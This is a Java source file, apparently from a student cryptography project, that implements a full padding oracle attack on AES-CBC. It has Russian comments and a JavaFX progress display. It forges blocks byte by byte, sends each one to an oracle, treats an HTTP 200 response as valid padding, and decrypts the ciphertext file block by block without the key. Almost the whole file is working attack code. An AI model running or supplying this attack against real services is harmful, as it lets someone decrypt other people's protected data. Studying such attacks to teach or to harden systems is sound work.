package main.java.com.evgeniy_mh.paddingoracle;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.util.ArrayList;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.FutureTask;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.concurrent.Task;
import javafx.scene.control.ProgressIndicator;

public class AES_CBCBruteforcer {

  final static int AES_BLOCK_SIZE = 16;
  final private ProgressIndicator progressIndicator;

  final private DecodeInfo decodeInfo;

  public AES_CBCBruteforcer(ProgressIndicator progressIndicator, DecodeInfo decodeInfo) {
    this.progressIndicator = progressIndicator;
    this.decodeInfo = decodeInfo;
  }

  /**
   * @return true- расшифровка прошла успешно; false- произошла ошибка
   */
  public Task<Boolean> Bruteforce(File in, File out) {
    return new Task<Boolean>() {
      @Override
      protected Boolean call() throws Exception {
        //Переменная для хранения результата проверки правильности дополнения
        boolean error = false;

        //Список массивов дополнений используемый для поиска правильного дополнения
        //Инициализация списка
        ArrayList<byte[]> paddings = new ArrayList<>();
        for (int i = 1; i <= AES_BLOCK_SIZE; i++) {
          byte[] pad = new byte[AES_BLOCK_SIZE];
          for (int j = AES_BLOCK_SIZE - 1; j >= AES_BLOCK_SIZE - i; j--) {
            pad[j] = (byte) i;
          }
          paddings.add(pad);
        }

        //После инициализации paddings имеет следующее содержание:
        //0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1
        //0 0 0 0 0 0 0 0 0 0 0 0 0 0 2 2
        //0 0 0 0 0 0 0 0 0 0 0 0 0 3 3 3
        //...
        //0 15 15 15 15 15 15 15 15 15 15 15 15 15 15 15
        //16 16 16 16 16 16 16 16 16 16 16 16 16 16 16 16
        //Всего в paddings 16 возможных вариантов дополнений

        //Подсчет общего количества блоков в файле
        int blocksCount = (int) (in.length() / AES_BLOCK_SIZE);

        //Установка счетчика общего количества блоков в пользовательском интерфейсе
        decodeInfo.blocksCount.set(blocksCount);

        //Разбиение файла на блоки по 16 байт и создание списка блоков для обработки
        ArrayList<byte[]> fileBlocks = new ArrayList<>();
        for (int i = 0; i < blocksCount; i++) {
          byte[] buff = readBytesFromFile(in, i * 16, (i * 16) + AES_BLOCK_SIZE);
          fileBlocks.add(buff);
        }

        //Установка счетчика прошресса взлома шифра
        int resultProgress = (blocksCount - 1) * AES_BLOCK_SIZE * 256;
        int progress = 0;

        //Открытие потока для записи в файл резульатата расшифровки
        FileOutputStream fos = new FileOutputStream(out, true);

        //Цикл по блокам в файле
        for (int i = 1; !error && i < blocksCount; i++) {
          //Обновление номера текущего блока в пользовательском интерфейсе
          decodeInfo.currentBlock.set(i);

          //Массив для хранения подобраных значений числа g
          //Эти числа будут использоватся для получение расшифрованого значения блока
          byte[] G = new byte[AES_BLOCK_SIZE];
          //Счетчик используемый для записи в массив G
          int G_cnt = AES_BLOCK_SIZE - 1;

          //Цикл по байтам в блоке
          for (int b = 0; !error && b < 16; b++) {
            //Обновление номера текущего байта в пользовательском интерфейсе
            decodeInfo.currentByte.set(b);

            //Цикл по значению одного байта (подбор значения байта)
            for (int g = 0; g < 256; g++) {
              //g - число изменяющееся от 0 до 255 в каждом новом отправляемом сообщении

              //Pad - специально составленый блок дополнения
              //Выборка блока дополнения из списка возможных блоков дополнений
              byte[] Pad = paddings.get(b).clone();

              //доьавление операцией XOR числа g к Pad
              Pad[AES_BLOCK_SIZE - b - 1] = (byte) (Pad[AES_BLOCK_SIZE - b - 1] ^ g);
              if (b != 0) {
                //Если это не первый байт в сообщениии
                //Тогда необходимо добавить операцией XOR предыдущие угаданные числа g к Pad
                //Pad[0..15]=Pad[0..15] XOR G[0..15]
                for (int p = 0; p < AES_BLOCK_SIZE; p++) {
                  Pad[p] = (byte) (Pad[p] ^ G[p]);
                }
              }

              //tempFile - массив байт который будет отправлен оракулу
              byte[] tempFile = new byte[AES_BLOCK_SIZE * 2];
              //В C2 храниться текущий блок файла
              byte[] C2 = fileBlocks.get(i);

              //Инициализация массива байт для отправки оракулу
              //tempFile=Pad
              System.arraycopy(Pad, 0, tempFile, 0, AES_BLOCK_SIZE);
              //tempFile=Pad || C2 (конкатенация массив байт)
              System.arraycopy(C2, 0, tempFile, AES_BLOCK_SIZE, AES_BLOCK_SIZE);

              //Инициализация потока для отправки tempFile оракулу
              Callable<Integer> callable = new FileByteSender(tempFile);
              FutureTask<Integer> ftask = new FutureTask<>(callable);
              Thread thread = new Thread(ftask);
              //Запуск потока для отправки tempFile оракулу
              thread.start();

              int response = 0;
              try {
                //Ожидание ответа от оракула
                response = ftask.get();
              } catch (InterruptedException | ExecutionException ex) {
                //Обработка возможного исключения при ожидании ответа
                Logger.getLogger(FXMLController.class.getName()).log(Level.SEVERE, null, ex);
              }

              //Проверка кода отвека
              if (response == 200) {
                //Если дополнение было правильным
                //Запись угаданного числа g в массив G
                G[G_cnt--] = (byte) g;
                //Обновление счетчика прогресса взлома
                progress += 255 - g;
                break;
              } else if (g == 255) {
                //Если дополнение было неверным и число g достигло максимально допустимого значения
                //То произошла ошибка взлома сообщения
                error = true;
              }

              //Обновление счетчика прогресса взлома
              progress++;
              //Обновление счетчика прогресса взлома в пользовательском интерфейсе
              progressIndicator.setProgress((double) progress / (double) resultProgress);
            }
          }

          //После обработки всех байт в блоке С2 из списка блоков файла выбирается предшествующий C2 блок C1
          byte[] C1 = fileBlocks.get(i - 1).clone();
          for (int p = 0; p < AES_BLOCK_SIZE; p++) {
            //Добавление операцией XOR блока угаданных байт к блоку C1 зашифрованного файла
            //Получение расшифрованного значения блока C1
            C1[p] = (byte) (C1[p] ^ G[p]);
          }
          //Если это последний блок файла
          if ((i + 1) == blocksCount) {
            //Количество байт, которые будут удалены с конца файла
            int nToDeleteBytes = C1[AES_BLOCK_SIZE - 1];

            //Проверка правильности дополнения
            if (nToDeleteBytes > 0 && nToDeleteBytes <= 16) {
              byte[] shortC1 = new byte[AES_BLOCK_SIZE - nToDeleteBytes];
              System.arraycopy(C1, 0, shortC1, 0, shortC1.length);
              //Запись в файл результата расшифрованного блока C1 без дополнения
              fos.write(shortC1);
            } else {
              //Если дополнение неверно - произошла ошибка взлома
              error = true;
            }
          } else {
            //Запись в файл результата расшифрованного блока C1
            fos.write(C1);
          }

        }
        //Закрытие потока записи в файл результата
        fos.close();
        return !error;
      }
    };
  }

  public static byte[] readBytesFromFile(File f, int from, int to) {
    try {
      byte[] res;
      try (RandomAccessFile raf = new RandomAccessFile(f, "r")) {
        raf.seek(from);
        res = new byte[to - from];
        raf.read(res, 0, to - from);
      }
      return res;
    } catch (IOException ex) {
      Logger.getLogger(AES_CBCBruteforcer.class.getName()).log(Level.SEVERE, null, ex);
      return null;
    }
  }
}
